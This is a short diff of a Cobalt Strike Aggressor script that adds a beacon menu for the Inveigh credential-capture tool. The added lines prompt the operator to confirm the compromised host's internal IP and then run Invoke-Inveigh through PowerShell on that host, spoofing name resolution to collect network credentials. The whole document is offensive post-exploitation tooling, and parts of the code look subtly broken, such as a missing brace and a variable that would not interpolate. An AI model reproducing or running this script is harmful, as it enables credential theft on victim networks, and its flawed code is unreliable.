@@ -1,11 +1,9 @@
 # Adds menu driven support for inveigh
-# This is nowhere near done...
 # @Und3rf10w
-
 
 popup beacon_bottom {
 	Menu "Inveigh"{
-		item "Import Inveigh"{
+		item "Import Inveigh.ps1"{
 			local ('$bid');
 			foreach $bid ($1){
 				binput($1, "Imported Inveigh");
@@ -15,7 +13,12 @@ popup beacon_bottom {
 		item "Invoke-Inveigh"
 			local('$bid');
 			foreach $bid ($1){
-
+				# Load and execute specifying a specific local listening/spoofing IP using default settings
+				# Prompt user to confirm that the IP address for the beacon is correct.
+				$beacon_ip = binfo($1, "internal");
+				prompt_text("What is the internal IP address of this beacon?", " $beacon_ip " {
+					bpowershell($1, 'Invoke-Inveigh -IP $beacon_ip -OutputStreamOnly Y');
+				});
 			}
 	}
 }
